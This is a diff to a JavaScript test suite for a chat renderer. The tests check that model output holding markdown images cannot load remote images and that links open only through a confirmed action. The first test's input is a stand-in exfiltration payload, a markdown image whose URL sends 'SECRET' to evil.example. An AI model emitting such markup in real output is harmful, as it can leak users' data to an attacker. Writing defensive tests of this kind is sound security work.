@@ -104,7 +104,16 @@ it("does not auto-load remote images from model output", () => {
   const render = loadRenderer();
   const html = render("![x](https://evil.example/?d=SECRET) and [<img src=https://evil.example/a>](https://ok.example)");
   assert.ok(!/<img[^>]+evil\.example/.test(html), html);
-  assert.ok(html.includes('href="https://evil.example/?d=SECRET"'), html);
+  assert.ok(html.includes('data-action="open-link" data-url="https://evil.example/?d=SECRET"'), html);
+});
+
+it("opens web links only through the confirmed open-link action", () => {
+  const render = loadRenderer();
+  const html = render("[docs](https://docs.example/a?b=1&c=2) and [home](http://ok.example)");
+  assert.ok(!/href="https?:/.test(html), html);
+  assert.ok(html.includes('data-url="https://docs.example/a?b=1&amp;c=2"'), html);
+  assert.ok(html.includes('data-url="http://ok.example"'), html);
+  assert.equal((html.match(/data-action="open-link"/g) || []).length, 2, html);
 });
 
 it("chat CSP does not allow remote image loads", () => {
